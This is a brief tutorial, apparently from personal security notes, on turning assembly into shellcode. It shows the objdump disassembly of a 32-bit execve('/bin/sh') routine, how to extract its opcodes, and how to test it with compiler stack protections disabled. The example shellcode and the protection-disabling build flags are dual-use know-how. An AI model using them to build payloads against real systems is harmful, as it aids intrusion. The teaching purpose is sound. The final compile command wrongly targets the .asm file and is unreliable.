# Shellcode

- [Tutorial to write a simple shellcode (FR)](http://www.bases-hacking.org/afficher-shell.html)
- [Shellcodes Database](http://shell-storm.org/shellcode/)
- [Security related Youtube channel](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w/videos)

## Overview

> In my opinion, the best way to create your own shellcode is to code in assembly. This way you can execute precisely the instructions that you want, and you can use differents tricks to avoid NULL bytes.

- Since you have written your assembly code, you have to compile it to generate an object file from which you will get the operation codes. Some scripts exist to easily extract the op codes from an object file, maybe I will try some and put a link here, or write my own. Meanwhile, I let you handle this part :-)

## From assembly to shellcode

- You have written some awesome assembly code which spawn a shell as root, rm -rf the entire file system and make the coffee in less than 42 bytes ? Good ! Now you need to get the op codes.

/!\ The following example covers a 32-bits ELF architecture, you'll need to adapt the commands to the one of the binary in which you want to use your shellcode.

```console
$ nasm -f elf execve_sh_32bits.asm
$ objdump -d -M intel execve_sh_32bits.o

execve_sh_32bits.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:	eb 16                	jmp    18 <_str>

00000002 <_shspawn>:
   2:	31 c0                	xor    eax,eax
   4:	5b                   	pop    ebx
   5:	88 43 07             	mov    BYTE PTR [ebx+0x7],al
   8:	89 5b 08             	mov    DWORD PTR [ebx+0x8],ebx
   b:	89 43 0c             	mov    DWORD PTR [ebx+0xc],eax
   e:	b0 0b                	mov    al,0xb
  10:	8d 4b 08             	lea    ecx,[ebx+0x8]
  13:	8d 53 0c             	lea    edx,[ebx+0xc]
  16:	cd 80                	int    0x80

00000018 <_str>:
  18:	e8 e5 ff ff ff       	call   2 <_shspawn>

0000001d <sh_str>:
  1d:	2f                   	das    
  1e:	62 69 6e             	bound  ebp,QWORD PTR [ecx+0x6e]
  21:	2f                   	das    
  22:	73 68                	jae    8c <sh_str+0x6f>

```

- According to the output of `objdump`, you have to get the operation codes from top (`_start` label) to bottom and concatenate them, adding '\x' in front of each one to make them understandable by the machine as hexadecimal syntax instructions.

In this example, the shellcode will begin like this : `\xeb\x16\x31\xc0...` and so on.

## Checking

The last part is to check if your shellcode works as expected. To do so, you can use the 'code_tester.c' file attached. It will cast the shellcode provided as a function and execute it. Paste your shellcode in it, compile and run ! Do not forget to use the `-fno-stack-protector` and `-z execstack` flags in order to disable the compiler protections.

```console
$ gcc -fno-stack-protector -z execstack -m32 execve_sh_32bits.asm -o shellcode_tester
$ ./shellcode_tester
# WIP #
```